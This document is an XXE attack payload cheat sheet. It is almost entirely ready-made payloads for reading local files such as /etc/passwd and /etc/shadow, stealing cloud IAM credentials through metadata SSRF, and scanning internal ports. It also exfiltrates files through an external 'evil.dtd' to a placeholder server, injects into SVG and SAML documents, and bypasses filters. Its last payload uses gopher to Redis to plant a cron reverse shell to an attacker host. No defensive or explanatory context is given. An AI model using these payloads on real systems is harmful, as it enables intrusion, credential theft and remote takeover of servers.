# XXE Payload Library

## Classic — File Read (Visible Output)

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
<root><data>&xxe;</data></root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>
<root><data>&xxe;</data></root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">]>
<root><data>&xxe;</data></root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>
```

## Classic — SSRF

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://YOUR-SERVER/">]>
<root><data>&xxe;</data></root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<root><data>&xxe;</data></root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://localhost:8080/actuator/env">]>
<root><data>&xxe;</data></root>
```

## Classic — Port Scan Probes

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY p22 SYSTEM "http://127.0.0.1:22/">
                <!ENTITY p80 SYSTEM "http://127.0.0.1:80/">
                <!ENTITY p443 SYSTEM "http://127.0.0.1:443/">
                <!ENTITY p3306 SYSTEM "http://127.0.0.1:3306/">
                <!ENTITY p5432 SYSTEM "http://127.0.0.1:5432/">
                <!ENTITY p6379 SYSTEM "http://127.0.0.1:6379/">
                <!ENTITY p27017 SYSTEM "http://127.0.0.1:27017/">
                <!ENTITY p9200 SYSTEM "http://127.0.0.1:9200/">
                <!ENTITY p8500 SYSTEM "http://127.0.0.1:8500/">]>
<root>
  <p22>&p22;</p22><p80>&p80;</p80><p443>&p443;</p443>
  <p3306>&p3306;</p3306><p6379>&p6379;</p6379>
</root>
```

## Error-Based (visible errors, no reflection)

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root/>
```

## Blind OOB — DNS/HTTP Confirmation

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://YOUR-OOB-DOMAIN/">
]>
<root><data>&xxe;</data></root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://YOUR-OOB-DOMAIN/test">
  %remote;
]>
<root/>
```

## Blind OOB — External DTD File Exfiltration (host evil.dtd on YOUR-SERVER)

**evil.dtd content:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://YOUR-SERVER/?data=%file;'>">
%wrap;
%send;
```

**XXE payload to trigger it:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://YOUR-SERVER/evil.dtd">
  %remote;
]>
<root/>
```

## Blind OOB — PHP Base64 Filter (multi-line files)

**evil.dtd content:**
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://YOUR-SERVER/?data=%file;'>">
%wrap;
%send;
```

**Trigger:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://YOUR-SERVER/evil.dtd">
  %remote;
]>
<root/>
```

## Blind OOB — Error Based (no outbound HTTP)

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %exfil;
]>
<root/>
```

## XInclude (no DOCTYPE control required)

```xml
<data xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</data>
```

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="http://YOUR-SERVER/"/>
</foo>
```

## SVG Upload

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text font-size="12" x="0" y="20">&xxe;</text>
</svg>
```

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY % remote SYSTEM "http://YOUR-SERVER/evil.dtd">
  %remote;
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <circle cx="100" cy="100" r="80"/>
</svg>
```

## SAML XXE (inject outside signed assertion)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE samlp:Response [
  <!ENTITY % remote SYSTEM "http://YOUR-SERVER/evil.dtd">
  %remote;
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_ORIGINAL_ID" Version="2.0">
  <!-- original assertion content preserved -->
</samlp:Response>
```

## XSLT — File Read via document()

```xml
<?xml version="1.0"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:template match="/">
    <result><xsl:value-of select="document('file:///etc/passwd')"/></result>
  </xsl:template>
</xsl:stylesheet>
```

## PHP RCE (expect:// wrapper — rare)

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://id">]>
<root><data>&xxe;</data></root>
```

## Bypass — UTF-16 Encoding

Generate with Python:
```bash
python3 -c "
payload = '''<?xml version=\"1.0\" encoding=\"UTF-16\"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>
<root><data>&xxe;</data></root>'''
open('payload_utf16.xml','wb').write(payload.encode('utf-16'))
"
```

## Bypass — Chunked Transfer

```http
POST /api/xml HTTP/1.1
Host: target.com
Content-Type: application/xml
Transfer-Encoding: chunked

1c
<?xml version="1.0"?>
<!
1d
DOCTYPE root [<!ENTITY xxe
23
SYSTEM "file:///etc/passwd">]>
15
<root><data>&xxe;</data>
7
</root>
0

```

## Bypass — Comment in DOCTYPE

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!--bypass--><!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

## Bypass — PUBLIC identifier

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe PUBLIC "-//test//" "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

## Bypass — netdoc:// (Java — handles newlines)

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

## Bypass — jar:// (Java — two-stage)

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "jar:http://YOUR-SERVER/payload.jar!/evil.txt">]>
<root><data>&xxe;</data></root>
```

## Gopher — Redis RCE via XXE→SSRF

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2428%0D%0A%0A%0A%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER%2F4444%200%3E%261%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A%2Fvar%2Fspool%2Fcron%2F%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A">
]>
<root><data>&xxe;</data></root>
```
